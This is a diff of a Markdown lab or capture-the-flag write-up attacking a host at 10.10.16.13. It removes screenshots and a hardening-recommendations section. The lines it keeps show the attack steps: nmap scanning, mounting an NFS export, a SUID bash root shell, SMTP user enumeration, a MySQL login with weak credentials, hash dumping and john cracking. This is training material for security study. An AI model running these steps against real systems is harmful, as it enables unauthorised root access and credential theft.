@@ -22,8 +22,6 @@ nmap -sS -sV -O -Pn -p- 10.10.16.13
 - 46645/tcp — mountd
 - 56517/tcp — mountd
 
-![Nmap Scan](images/image-20250503003559188.png)
-
 ---
 
 ## 📁 NFS Attack
@@ -37,8 +35,6 @@ showmount -e 10.10.16.13
 sudo mount -t nfs 10.10.16.13:/home/user /mnt/nfs
 ```
 
-![Mount NFS](images/image-20250503004653389.png)
-
 ---
 
 ### ⚙️ Privilege Escalation with SUID Bash
@@ -51,7 +47,6 @@ sudo chown root bash
 sudo chmod +s bash
 ```
 
-![Copy Bash](images/image-20250503195310704.png)
 
 Then we get a root shell using:
 
@@ -59,7 +54,6 @@ Then we get a root shell using:
 ./bash -p
 ```
 
-![Root Shell](images/image-20250503202950261.png)
 
 ---
 
@@ -77,7 +71,6 @@ set RHOSTS 10.10.16.13
 run
 ```
 
-![SMTP Enum](images/image-20250504210311199.png)
 
 ---
 
@@ -90,8 +83,6 @@ mysql -h 10.10.16.13 -u root -p
 # password: password
 ```
 
-![MySQL Login](images/image-20250505001633560.png)
-
 Querying version and dumping hashes:
 
 ```sql
@@ -99,7 +90,6 @@ SELECT @@version;
 SELECT * FROM users;
 ```
 
-![SQL Version](images/image-20250505001729704.png)
 
 Extracted hash:
 
@@ -123,7 +113,6 @@ echo "carl:*EA031893AA21444B170FC2162A56978B8CEECE18" > hash.txt
 john hash.txt --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-![John Running](images/image-20250505003744664.png)
 
 ---
 
@@ -135,11 +124,3 @@ This target machine highlighted multiple common vulnerabilities:
 - Exposed SMTP → user enumeration
 - Weak MySQL credentials → credential dumping
 
----
-
-### 🛡️ Hardening Recommendations:
-
-- Restrict NFS exports by IP and UID
-- Use firewall rules to limit internal services
-- Disable unnecessary SMTP accounts
-- Enforce strong MySQL credentials and host binding
